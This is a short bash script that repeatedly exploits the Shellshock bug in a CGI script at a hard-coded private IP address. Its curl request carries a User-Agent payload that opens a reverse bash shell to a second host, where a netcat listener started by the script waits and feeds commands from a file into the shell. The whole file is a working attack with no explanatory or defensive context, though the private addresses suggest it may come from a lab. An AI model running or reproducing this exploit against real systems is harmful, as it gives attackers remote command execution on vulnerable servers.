#!/bin/bash

for i in $(eval echo {$1..$2})
do
sleep 5
tail -f fifo1 | nc -l 8000 &
curl -k -A "() { :; };/bin/bash -i >& /dev/tcp/10.176.148.53/8000 0>&1" --data @data.txt https://10.176.147.83/cgi-bin/ss & 
cat test > fifo1
sleep 2


sudo killall -s SIGINT nc
sudo killall -9 tail




sleep 2
done

